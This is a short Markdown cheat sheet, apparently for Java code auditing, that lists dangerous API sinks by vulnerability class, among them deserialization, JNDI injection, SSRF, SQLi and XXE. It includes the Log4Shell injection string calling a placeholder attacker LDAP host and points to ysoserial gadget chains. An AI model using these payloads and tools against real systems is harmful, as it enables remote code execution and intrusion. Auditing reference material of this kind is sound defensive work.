# Java Sinks

---

## RCE

`Runtime.getRuntime().exec()`, `ProcessBuilder.start()`, `ScriptEngine.eval()` (Nashorn, GraalJS), EL injection (`javax.el.*`), OGNL (`ognl.Ognl.getValue()`), SpEL (`SpelExpressionParser.parseExpression()`), MVEL (`MVEL.eval()`), JEXL (`JexlEngine.createExpression()`)

---

## Deserialization

`ObjectInputStream.readObject/readUnshared()`, `XMLDecoder.readObject()`, `XStream.fromXML()`, `SnakeYAML Yaml.load()`, `Jackson ObjectMapper.readValue()` with `enableDefaultTyping()` or `@JsonTypeInfo`, `Kryo.readObject()`, `Hessian2Input.readObject()`, `JMX MBeanServer`, `RMI registry` — use ysoserial/ysoserial-modified for gadget chains

**Format-specific deserialization sinks:**
- **JSON:** `Fastjson JSON.parseObject()` (1.2.24 JNDI, 1.2.47 cache poison), `Flexjson JSONDeserializer.deserialize()`, `Genson genson.deserialize()`, `json-io JsonReader.jsonToJava()`, `Jodd jsonParser.parse()`
- **YAML:** `SnakeYAML Yaml.load()` (ScriptEngineManager gadget), `jYAML Yaml.loadType()`, `YamlBeans YamlReader`
- **XML:** `XMLDecoder.readObject()`, `Castor Unmarshaller.unmarshal()`
- **Binary:** `Hessian2Input.readObject()` (MobileIron CVE-2020-15505, Dubbo), `Kryo readClassAndObject()`, AMF (BlazeDS/Flamingo/GraniteDS/Red5)
- **No-fix sinks:** Apache XML-RPC all versions (no patch available)

---

## JNDI Injection

`InitialContext.lookup(userInput)`, `JndiTemplate.lookup()`, `JdbcRowSet.setDataSourceName()` — protocols: `rmi://`, `ldap://`, `dns://`, `iiop://` — remote class loading for RCE (Log4Shell: `${jndi:ldap://attacker/a}`)

---

## SSRF

`URL.openConnection()`, `URL.openStream()`, `HttpURLConnection`, `HttpClient.send()`, `RestTemplate.getForObject()`, `WebClient.get()`, `OkHttpClient`, `Apache HttpClient`

---

## SQLi

`Statement.executeQuery(string_concat)`, `PreparedStatement` with string concat (misuse), `createQuery()` (JPA/Hibernate with concat), `createNativeQuery()`, `JdbcTemplate.queryForObject()` with string concat

---

## Additional Java Sinks

- **XXE:** `DocumentBuilderFactory.newInstance()` without `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING)`, `SAXParserFactory`, `XMLInputFactory`, `TransformerFactory`, `SchemaFactory`, `Unmarshaller`
- **SSTI:** Spring View name injection, Thymeleaf pre-processing `__${...}__`, Freemarker `new()` built-in
- **Path Traversal:** `new File(base, userInput)`, `Paths.get()`, `Files.readAllBytes()` with unsanitized path, `ClassLoader.getResourceAsStream()`
- **LDAP:** `DirContext.search()` with string-concatenated filter, `SpringLdapTemplate.search()`
- **SSRF via Log4j:** `${jndi:ldap://...}` in any logged string (Log4Shell — CVE-2021-44228)
